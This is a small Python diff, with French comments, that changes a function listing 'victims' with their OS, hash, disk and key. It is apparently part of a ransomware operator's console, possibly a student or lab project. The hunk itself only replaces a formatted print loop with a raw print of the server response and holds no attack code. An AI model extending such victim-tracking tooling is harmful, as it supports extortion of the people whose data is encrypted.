@@ -38,9 +38,10 @@ def affichage_liste_victimes():
         print("Aucune réponse reçue.")
         return
     #affiche les données
-    data = response['victims']
+    print(response)
+    '''data = response['victims']
     for victim in data:
-        print(f"Victime : {victim[0]} | os: {victim[1]} | hash : {victim[2]} | disk : {victim[3]} | key : {victim[4]} ")
+        print(f"Victime : {victim[0]} | os: {victim[1]} | hash : {victim[2]} | disk : {victim[3]} | key : {victim[4]} ")'''
 
 
 
